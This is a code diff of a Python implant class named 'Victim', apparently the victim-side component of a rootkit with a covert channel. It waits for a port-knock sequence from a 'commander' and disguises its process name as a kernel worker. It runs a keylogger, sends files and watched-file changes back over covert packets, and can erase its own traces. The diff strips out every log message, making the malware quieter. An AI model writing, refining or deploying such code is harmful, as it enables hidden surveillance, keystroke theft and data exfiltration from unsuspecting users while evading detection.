@@ -19,7 +19,6 @@ try:
     PYINOTIFY_AVAILABLE = True
 except ImportError:
     PYINOTIFY_AVAILABLE = False
-    print("[!] pyinotify not installed. File watching will use polling fallback.")
 
 class Victim:
     def __init__(self):
@@ -35,7 +34,6 @@ class Victim:
         self.running = True
         self.command_buffer = ""
         self.keylogger_active = False
-        
         self.conceal_process()
 
     def conceal_process(self):
@@ -45,11 +43,10 @@ class Victim:
             try:
                 import prctl
                 prctl.set_name("[kworker/u]")
-                print("[*] Process concealed using prctl")
             except ImportError:
-                print("[*] Process name concealed (argv[0] only)")
-        except Exception as e:
-            print(f"[!] Concealment limited: {e}")
+                pass
+        except Exception:
+            pass
 
     def _generate_expected_sequence(self, target_ip):
         """Replicates PortKnocker logic to validate the knock sequence."""
@@ -76,9 +73,6 @@ class Victim:
 
     def wait_for_knock(self):
         """Sniffs for the port knock sequence to initiate session."""
-        print("[*] Waiting for port knock sequence...")
-        print("[*] Process concealed. Waiting for commander...")
-        
         self.knock_state = 0
         self.expected_knocks = []
         self.temp_tx = None
@@ -86,7 +80,7 @@ class Victim:
         self.knock_source_ip = None
         self.last_knock_time = 0
         self.sequence_locked = False
-    
+        
         def process_knock(pkt):
             if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
                 return None
@@ -100,8 +94,6 @@ class Victim:
             
             current_time = time.time()
             if current_time - self.last_knock_time > 60:
-                if self.knock_state > 0:
-                    print(f"[!] Timeout - resetting knock sequence")
                 self.knock_state = 0
                 self.expected_knocks = []
                 self.sequence_locked = False
@@ -114,8 +106,6 @@ class Victim:
                     self.expected_knocks, self.temp_tx, self.temp_rx = res
                     self.knock_source_ip = src_ip
                     self.sequence_locked = True
-                    print(f"[*] Expected ports: {self.expected_knocks}")
-                    print(f"[*] Covert TX/RX: {self.temp_tx}/{self.temp_rx}")
                 else:
                     return None
 
@@ -124,19 +114,14 @@ class Victim:
 
             if dport == self.expected_knocks[self.knock_state]:
                 self.knock_state += 1
-                print(f"[*] Knock {self.knock_state}/3 on port {dport} from {src_ip}")
-                
                 if self.knock_state >= 3:
                     self.commander_ip = src_ip
                     self.tx_port = self.temp_tx
                     self.rx_port = self.temp_rx
                     self.is_connected = True
-                    print(f"\n[+] Session Established with {self.commander_ip}")
-                    print(f"[+] Covert Ports: TX={self.tx_port}, RX={self.rx_port}")
                     return None
             else:
                 if self.knock_state > 0 and dport not in self.expected_knocks[:self.knock_state]:
-                    print(f"[!] Wrong port {dport}, expected {self.expected_knocks[self.knock_state]}. Resetting.")
                     self.knock_state = 0
             
             return None
@@ -163,8 +148,7 @@ class Victim:
                 )
                 send(pkt, verbose=False)
                 time.sleep(0.01)
-            except Exception as e:
-                print(f"[!] Error sending packet: {e}")
+            except Exception:
                 break
 
     def command_listener(self):
@@ -185,9 +169,7 @@ class Victim:
                       timeout=2, 
                       count=0,
                       store=0)
-            except Exception as e:
-                if self.running:
-                    print(f"[!] Sniffer error: {e}")
+            except Exception:
                 pass
 
     def handle_command(self, raw_cmd):
@@ -198,8 +180,6 @@ class Victim:
         parts = raw_cmd.split(":", 1)
         cmd_type = parts[0]
         data = parts[1] if len(parts) > 1 else ""
-
-        print(f"[*] Command: {cmd_type}")
 
         if cmd_type == "EXIT":
             self.send_covert_response("Session terminated.\n")
@@ -249,16 +229,13 @@ class Victim:
             self.keylogger_thread.start()
             self.keylogger_active = True
             self.send_covert_response("Keylogger started.\n")
-            print("[*] Keylogger thread started")
         except Exception as e:
             self.send_covert_response(f"Keylogger error: {e}\n")
-            print(f"[!] Keylogger error: {e}")
 
     def stop_keylogger(self):
         """Stop the keylogger and delete the data folder."""
         if not self.keylogger_active:
             self.send_covert_response("Keylogger not running.\n")
-            print("[*] No keylogger thread running")
             return
         
         if self.keylogger:
@@ -266,7 +243,6 @@ class Victim:
         
         if self.keylogger_thread and self.keylogger_thread.is_alive():
             self.keylogger_thread.join(timeout=2)
-            print("[*] Keylogger thread joined")
         
         self.keylogger_active = False
         self.keylogger_thread = None
@@ -275,15 +251,11 @@ class Victim:
         try:
             if os.path.exists(data_folder):
                 shutil.rmtree(data_folder)
-                print(f"[*] Data folder deleted: {data_folder}")
                 self.send_covert_response("Keylogger stopped. Data folder deleted.\n")
             else:
                 self.send_covert_response("Keylogger stopped. No data folder found.\n")
         except Exception as e:
-            print(f"[!] Error deleting data folder: {e}")
             self.send_covert_response(f"Error deleting  {e}\n")
-        
-        print("[*] Keylogger thread stopped")
 
     def send_keylog(self):
         """Send the keylog file contents to commander."""
@@ -342,12 +314,10 @@ class Victim:
                     self.send_covert_response(content.hex())
                 
                 self.send_covert_response(f"\n=== FILE TRANSFER COMPLETE ===\n")
-                print(f"[*] File {filename} sent ({file_size} bytes)")
             else:
                 self.send_covert_response(f"Error: File {filename} not found.\n")
         except Exception as e:
             self.send_covert_response(f"Error: {str(e)}\n")
-            print(f"[!] File transfer error: {e}")
 
     def receive_file(self, filename):
         """Prepare to receive a file from commander."""
@@ -360,7 +330,6 @@ class Victim:
                 pass
             
             self.send_covert_response(f"File {filename} created.\n")
-            print(f"[*] File {filename} ready for data")
         except Exception as e:
             self.send_covert_response(f"Error creating file: {str(e)}\n")
 
@@ -382,7 +351,6 @@ class Victim:
                     self.send_covert_response(content.hex())
                 
                 self.send_covert_response(f"[WATCH END] {filepath}\n")
-                print(f"[*] Watched file sent: {filepath} ({file_size} bytes)")
         except Exception as e:
             self.send_covert_response(f"[WATCH ERROR] {filepath}: {e}\n")
 
@@ -396,21 +364,16 @@ class Victim:
         try:
             import pyinotify
             
-            # FIX: Convert to absolute path
             path = os.path.abspath(path)
             
-            # FIX: Determine watch directory and target file
             if os.path.isfile(path):
                 watch_dir = os.path.dirname(path)
                 target_file = os.path.basename(path)
-                # FIX: Handle empty dirname for files in current directory
                 if watch_dir == "":
                     watch_dir = "."
-                print(f"[*] Watching file {target_file} in directory {watch_dir}")
             elif os.path.isdir(path):
                 watch_dir = path
                 target_file = None
-                print(f"[*] Watching directory {watch_dir}")
             else:
                 self.send_covert_response(f"Error: Path {path} does not exist.\n")
                 return
@@ -424,38 +387,29 @@ class Victim:
                 
                 def process_IN_MODIFY(watch_self, event):
                     if not event.dir:
-                        # FIX: Filter by target file if watching a single file
                         if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            print(f"[*] File modified: {event.pathname}")
                             time.sleep(0.5)
                             watch_self.victim._send_watched_file(event.pathname)
                 
                 def process_IN_CREATE(watch_self, event):
                     if not event.dir:
                         if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            print(f"[*] File created: {event.pathname}")
                             time.sleep(0.5)
                             watch_self.victim._send_watched_file(event.pathname)
                 
                 def process_IN_DELETE(watch_self, event):
                     if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                        print(f"[*] File deleted: {event.pathname}")
                         watch_self.victim.send_covert_response(f"[WATCH DELETE] {event.pathname}\n")
                 
-                # FIX: Add IN_CLOSE_WRITE for reliable file write detection
                 def process_IN_CLOSE_WRITE(watch_self, event):
                     if not event.dir:
                         if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            print(f"[*] File closed after write: {event.pathname}")
                             time.sleep(0.5)
                             watch_self.victim._send_watched_file(event.pathname)
             
             handler = WatchHandler(self, target_file)
-            
-            # FIX: Use notifier with timeout instead of loop()
             self.watcher_observer = pyinotify.Notifier(wm, handler, timeout=1000)
             
-            # FIX: Correct event mask
             mask = (
                 pyinotify.IN_MODIFY |
                 pyinotify.IN_CREATE |
@@ -465,29 +419,22 @@ class Victim:
             
             wm.add_watch(watch_dir, mask, rec=True, auto_add=True)
             
-            # FIX: Use process_events() in a loop instead of observer.loop()
             def watch_loop():
                 while self.running and self.is_connected:
                     try:
                         self.watcher_observer.process_events()
                         if self.watcher_observer.check_events():
                             self.watcher_observer.read_events()
-                    except Exception as e:
-                        if self.running:
-                            print(f"[!] Watch error: {e}")
+                    except Exception:
                         break
             
             self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
             self.watcher_thread.start()
             
-            print(f"[*] Watching {path} (using pyinotify)")
             self.send_covert_response(f"Watching {path}...\n")
             
         except Exception as e:
             self.send_covert_response(f"Watch error: {e}\n")
-            print(f"[!] Watch error: {e}")
-            import traceback
-            traceback.print_exc()
             self._start_watcher_polling(path)
 
     def _start_watcher_polling(self, path):
@@ -511,51 +458,39 @@ class Victim:
         
         self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
         self.watcher_thread.start()
-        print(f"[*] Watching {path} (polling fallback)")
 
     def stop_watcher(self):
         """Stop the file/directory watcher."""
         try:
-            # FIX: Properly stop the observer first
             if self.watcher_observer:
                 self.watcher_observer.stop()
                 self.watcher_observer = None
-                print("[*] pyinotify observer stopped")
             
-            # Then stop the thread
             if self.watcher_thread and self.watcher_thread.is_alive():
                 self.watcher_thread = None
-                print("[*] Watcher thread stopped")
             
             self.send_covert_response("Watcher stopped.\n")
-            print("[*] File watcher stopped")
         except Exception as e:
             self.send_covert_response(f"Error stopping watcher: {e}\n")
-            print(f"[!] Error stopping watcher: {e}")
 
     def uninstall(self):
         """Remove the rootkit and clean up all traces."""
         self.send_covert_response("Uninstalling rootkit...\n")
         self.running = False
         
-        # 1. Stop the watcher observer
         if self.watcher_observer:
             try:
                 self.watcher_observer.stop()
                 self.watcher_observer = None
-                print("[*] Watcher observer stopped")
             except Exception:
                 pass
         
-        # 2. Stop the watcher thread
         if self.watcher_thread and self.watcher_thread.is_alive():
             try:
                 self.watcher_thread = None
-                print("[*] Watcher thread stopped")
             except Exception:
                 pass
         
-        # 3. Stop the keylogger
         if self.keylogger:
             self.keylogger.running = False
         
@@ -563,22 +498,17 @@ class Victim:
             try:
                 self.keylogger_thread.join(timeout=2)
                 self.keylogger_thread = None
-                print("[*] Keylogger thread stopped")
             except Exception:
                 pass
         
-        # 4. Delete keylog data folder
         try:
             data_folder = "./data"
             if os.path.exists(data_folder):
                 shutil.rmtree(data_folder)
-                print("[*] Data folder removed")
         except Exception:
             pass
         
-        # 5. Delete transferred files from commander (PUT files)
         try:
-            # Common locations where transferred files might be stored
             transfer_locations = [
                 "./received",
                 "./downloads",
@@ -588,60 +518,40 @@ class Victim:
             for location in transfer_locations:
                 if os.path.exists(location):
                     shutil.rmtree(location)
-                    print(f"[*] Transfer folder removed: {location}")
         except Exception:
             pass
         
-        # 6. Delete watched folder (if victim created one for some reason)
         try:
             watched_folder = "./watched"
             if os.path.exists(watched_folder):
                 shutil.rmtree(watched_folder)
-                print("[*] Watched folder removed")
         except Exception:
             pass
         
-        # 7. Remove any log files in current directory
         try:
             for file in os.listdir("."):
                 if file.endswith(".log") or file.endswith(".txt"):
                     if "keylog" in file.lower() or "capture" in file.lower():
                         os.remove(file)
-                        print(f"[*] Log file removed: {file}")
         except Exception:
             pass
         
-        # 8. Send final confirmation
         self.send_covert_response("Rootkit uninstalled. All traces removed.\n")
-        print("[*] Rootkit uninstalled")
-        
-        # 9. Exit the victim program
         os._exit(0)
 
     def run(self):
         """Main victim loop."""
-        if os.geteuid() != 0:
-            print("[!] WARNING: Root privileges recommended for keylogger and sniffing.")
-            print("[!] Some features may not work without sudo.")
-        
-        print("[*] Victim starting...")
-        print(f"[*] PID: {os.getpid()}")
-        
         self.wait_for_knock()
         
         if self.is_connected:
             cmd_thread = threading.Thread(target=self.command_listener, daemon=True)
             cmd_thread.start()
-            print("[*] Command listener started")
             
             try:
                 while self.running:
                     time.sleep(1)
             except KeyboardInterrupt:
-                print("\n[*] Victim stopping...")
                 self.running = False
-        else:
-            print("[!] Session not established.")
 
 if __name__ == "__main__":
     victim = Victim()
